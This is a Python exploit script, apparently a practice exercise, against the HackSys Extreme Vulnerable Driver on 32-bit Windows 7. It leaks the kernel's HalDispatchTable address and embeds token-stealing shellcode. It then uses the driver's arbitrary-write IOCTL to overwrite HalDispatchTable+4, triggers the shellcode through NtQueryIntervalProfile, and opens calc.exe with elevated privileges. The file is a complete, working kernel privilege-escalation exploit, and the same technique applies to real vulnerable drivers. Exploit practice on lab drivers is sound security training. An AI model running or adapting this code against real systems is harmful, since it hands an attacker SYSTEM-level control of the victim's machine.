import os
import struct
import ctypes
from ctypes import wintypes
import sys




GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000
FILE_SHARE_DELETE = 0x00000004
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
CREATE_NEW = 1
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
OPEN_ALWAYS = 4
TRUNCATE_EXISTING = 5
HEAP_ZERO_MEMORY=0x00000008


class _SYSTEM_MODULE_INFORMATION_ENTRY (ctypes.Structure):
    _fields_ = [("WhoCares",		ctypes.c_void_p ),
        ("WhoCares2", ctypes.c_void_p),
		("Base",		ctypes.c_void_p),
		("Size",		wintypes.ULONG),
		("Flags",		wintypes.ULONG),
		("Index",		wintypes.USHORT),
		("NameLength",		wintypes.USHORT),
		("LoadCount",		wintypes.USHORT),
		("PathLength",		wintypes.USHORT),
		("ImageName",		ctypes.c_char * 256)]

def SMI_factory(nsize):
    class __SYSTEM_MODULE_INFORMATION(ctypes.Structure):
        _fields_ = [("ModuleCount", wintypes.ULONG),
                    ('Modules', wintypes.ARRAY (_SYSTEM_MODULE_INFORMATION_ENTRY,nsize))]

    return __SYSTEM_MODULE_INFORMATION


class _WRITE_WHAT_WHERE(ctypes.Structure):
    _fields_ = [('What', ctypes.c_void_p),
                ('Where', ctypes.c_void_p)]



def GetHalDispatchTable():
    SystemModuleInformation=11

    hNtDll=ctypes.windll.kernel32.GetModuleHandleA("ntdll.dll")
    if (not hNtDll) :
        print ("[-] Failed To get module handle NtDll.dll\n")

    NTquery=ctypes.windll.kernel32.GetProcAddress(hNtDll, "NtQuerySystemInformation")

    if (not NTquery) :
        print ("[-] Failed To get NTquerySystemInformation address.dll\n")

    print "NtQuerySystemInformation address = 0x%x"%NTquery

    u = ctypes.c_ulong(0)


    ctypes.windll.ntdll.NtQuerySystemInformation(SystemModuleInformation, 0, 0, ctypes.byref(u))

    SYSTEM_MODULE_INFORMATION=SMI_factory(u.value)

    pSystemModuleInformation=SYSTEM_MODULE_INFORMATION()

    buf=ctypes.create_string_buffer(u.value)

    NtStatus=ctypes.windll.ntdll.NtQuerySystemInformation(SystemModuleInformation, buf, u.value, 0)


    ctypes.memmove(ctypes.byref(pSystemModuleInformation), buf,ctypes.sizeof(buf))

    KernelBaseAddressInKernelMode=(pSystemModuleInformation.Modules[0].Base)
    KernelImage=pSystemModuleInformation.Modules[0].ImageName
    KernelImage=KernelImage[KernelImage.find("\\"):]

    splitted=KernelImage.split("\\")
    KernelImage=splitted[-1]

    print("[+] Loaded Kernel: %s\n"% KernelImage)
    print("[+] Kernel Base Address: 0x%x\n"% KernelBaseAddressInKernelMode)

    hKernelInUserMode = ctypes.windll.LoadLibrary(KernelImage)

    if ( not hKernelInUserMode) :
        print ("[-] Failed To Load Kernel\n")
        sys.exit()

    print "User Mode Address :" + hex(hKernelInUserMode._handle)

    HalDispatchTable_usr = ctypes.windll.kernel32.GetProcAddress(hKernelInUserMode._handle, "HalDispatchTable")

    print "HalDispatchTable_usr: "+ hex(HalDispatchTable_usr)

    HalDispatchTable_off = HalDispatchTable_usr - hKernelInUserMode._handle

    HalDispatchTable_krn = HalDispatchTable_off + KernelBaseAddressInKernelMode

    print "HalDispatchTable_krn: "+ hex(HalDispatchTable_krn)

    return HalDispatchTable_krn


print "OJO SOLO TARGETS WINDOWS 7 de 32 BITS no FUNCIONA EN 64 bits"

shellcode=ctypes.create_string_buffer("\x53\x56\x57\x60\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x5F\x5E\x5B\xC3")


hDevice = ctypes.windll.kernel32.CreateFileA(r"\\.\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None )

print int(hDevice)

heap=ctypes.windll.kernel32.GetProcessHeap()

WriteWhatWhere_inst=_WRITE_WHAT_WHERE()

WriteWhatWhere=ctypes.windll.kernel32.HeapAlloc(heap, HEAP_ZERO_MEMORY,ctypes.sizeof(_WRITE_WHAT_WHERE))

print("[+] Memory Allocated: 0x%x\n"% WriteWhatWhere)

print ("[+] Allocation Size: 0x%X\n"% ctypes.sizeof(_WRITE_WHAT_WHERE))

print("[+] Gathering Information About Kernel\n")



Hal_address_kernel=GetHalDispatchTable()

if (not Hal_address_kernel) :
    print("[-] Failed Gathering Information\n")
    sys.exit()

HalDispatchTablePlus4 = Hal_address_kernel + ctypes.sizeof(ctypes.c_voidp)

print "HAL TABLE PLUS 4",hex(HalDispatchTablePlus4)

print ("[+] Preparing WRITE_WHAT_WHERE structure\n")



buf = ctypes.create_string_buffer(ctypes.sizeof(ctypes.c_voidp)*2)


ctypes.memmove(ctypes.byref(WriteWhatWhere_inst), buf, ctypes.sizeof(buf))

old = ctypes.c_long(1)
ctypes.windll.kernel32.VirtualProtect(ctypes.addressof(shellcode), ctypes.c_int(ctypes.sizeof(shellcode)),0x40,ctypes.byref(old))

pshellcode = ctypes.c_char_p(ctypes.addressof(shellcode))

WriteWhatWhere_inst.What =ctypes.addressof(pshellcode)
WriteWhatWhere_inst.Where = HalDispatchTablePlus4


print("[+] WriteWhatWhere->What: 0x%x\n"%int( WriteWhatWhere_inst.What))
print ("[+] WriteWhatWhere->Where: 0x%x\n"% WriteWhatWhere_inst.Where)


print ("[+] Triggering Arbitrary Memory Overwrite\n");



FILE_DEVICE_UNKNOWN=0x00000022
METHOD_NEITHER=3
FILE_ANY_ACCESS=0

HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE=0x22200b

bytes_returned = wintypes.DWORD(0)

ctypes.windll.kernel32.DeviceIoControl(hDevice,HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, ctypes.byref(WriteWhatWhere_inst), ctypes.sizeof(WriteWhatWhere_inst), None, 0, ctypes.pointer(bytes_returned),0)


Interval=ctypes.c_int(0)

ctypes.windll.ntdll.NtQueryIntervalProfile(0x1337, ctypes.byref(Interval))

ctypes.windll.kernel32.CloseHandle(hDevice)
os.system("calc.exe")





